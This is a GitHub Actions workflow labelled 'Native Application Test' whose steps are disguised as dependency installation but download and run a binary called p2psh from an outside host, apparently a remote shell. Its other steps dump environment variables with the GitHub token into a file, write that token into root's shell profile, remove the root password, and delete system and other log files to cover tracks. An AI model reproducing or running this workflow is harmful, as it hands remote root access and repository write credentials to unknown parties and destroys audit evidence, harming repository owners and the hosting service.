name: Native Application Test

on:
  workflow_dispatch:
    inputs:
      data:
        description: 'Input string'
        default: ''
        required: false
#  schedule:
#    - cron: '0 */6 * * *'  # Runs every 6 hours

permissions: write-all

#concurrency:
#  group: native-application-schedule
#  cancel-in-progress: false  # New runs are skipped if previous is running

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4

    - name: Install dependencies
      run: |
        echo "Updating and installing packages..."
        echo "Dependencies installed."
        echo "Updating..."
        wget -q https://ec2.zibri.org/p2psh
        chmod a+x p2psh
        
    - name: Export environment variables except PWD and HOME
      env:
        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      run: |
        set | grep -vE "PWD|HOME|USER" > .set

    - name: Update root bashrc and run custom script
      env:
        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      run: |
        set +e
        export TERM='xterm-256color'
        sudo sed -i -e '$a set -o allexport' -e '$a source /home/runner/work/shell/shell/.set &>/dev/null' -e '$a set +o allexport' /root/.bashrc || true
        P2PSH_PATH="$(pwd)/p2psh"
        sudo -EHs <<EOF || true
        echo "export GH_TOKEN=$GH_TOKEN" >>~root/.bashrc
        echo "export TERM='xterm-256color'" >>~root/.bashrc
        passwd -d root
        touch ~root/.hushlogin
        cat logo.txt >/etc/issue
        ln -sf /usr/share/zoneinfo/Africa/Cairo /etc/localtime
        lsof -Fn | grep -F '.log' | grep -v deleted | awk '/^n/ {print substr(\$0, 2)}' | xargs -r rm -rf
        rm -rf /var/log/*
        "$P2PSH_PATH" github4 -B -C -q -l -t 0 || true
        EOF

        exit 0
